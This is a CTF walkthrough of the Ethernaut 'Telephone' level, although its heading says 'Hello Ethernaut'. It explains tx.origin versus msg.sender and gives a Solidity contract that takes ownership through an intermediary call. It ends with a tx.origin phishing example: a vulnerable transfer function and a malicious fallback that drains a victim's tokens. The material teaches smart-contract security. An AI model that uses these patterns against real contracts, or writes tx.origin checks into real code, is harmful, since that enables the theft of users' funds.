# Hello Ethernaut

## Challenge Description

Claim ownership of the contract below to complete this level.

Things that might help:

-   See the "[?](https://ethernaut.openzeppelin.com/help)" page above, section "Beyond the console"

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}
```

## Challenge Solution Walkthrough

When it comes to calling contracts, there are two types of entities involved: Externally Owned Accounts (EOAs) and other contracts. A contract cannot directly call another contract unless an EOA initiates the call to the first contract, which then calls the second contract. Let's explore this with an example:

Consider a scenario where Alice calls a contract called `FirstContract`, and `FirstContract` subsequently calls another contract named `SecondContract`. If we request `FirstContract` to return `msg.sender`, it will correctly provide Alice's address. Similarly, if we request `FirstContract` to return `tx.origin`, it will also return Alice's address.

However, things change when we examine the context of `SecondContract`, which is called by `FirstContract`. If we execute `msg.sender` within `SecondContract`, it will return the address of `FirstContract`. On the other hand, if we execute `tx.origin`, it will return Alice's address. In other words, `tx.origin` retrieves the address of the EOA that initially invoked the contract, while `msg.sender` retrieves the address of the contract or EOA that invoked the current contract in the previous step.

In the `Telephone` contract challenge, the goal is to become the `owner` by calling the `changeOwner()` function with `msg.sender` not being equal to `tx.origin`. To accomplish this, we need to deploy an additional contract and instruct it to call the `changeOwner()` function on our behalf.

To solve the challenge, we'll deploy the `TelephoneSolution` contract provided below. Ensure that the `Telephone.sol` file is placed in the same directory to compile this contract:

```solidit
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract TelephoneSolution {
    Telephone public telephone;

    constructor(address telephoneAddress) {
        telephone = Telephone(telephoneAddress);
    }

    function solveChallenge() public {
        telephone.changeOwner(msg.sender);
    }
}
```

After deploying the TelephoneSolution contract, invoke the `solveChallenge()` function and provide your address as the input parameter. This will trigger the Telephone contract's `changeOwner()` function, where msg.sender will be set to the address of the `TelephoneSolution` contract, while `tx.origin` remains your wallet address.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

While this example may be simple, confusing `tx.origin` with `msg.sender` can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).

An example of a possible attack is outlined below.

1. Use `tx.origin` to determine whose tokens to transfer, e.g.

```solidity
function transfer(address _to, uint _value) {
    tokens[tx.origin] -= _value;
    tokens[_to] += _value;
}
```

1. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.

```solidity
function () payable {
    token.transfer(attackerAddress, 10000);
}
```

1. In this scenario, `tx.origin` will be the victim's address (while `msg.sender` will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.
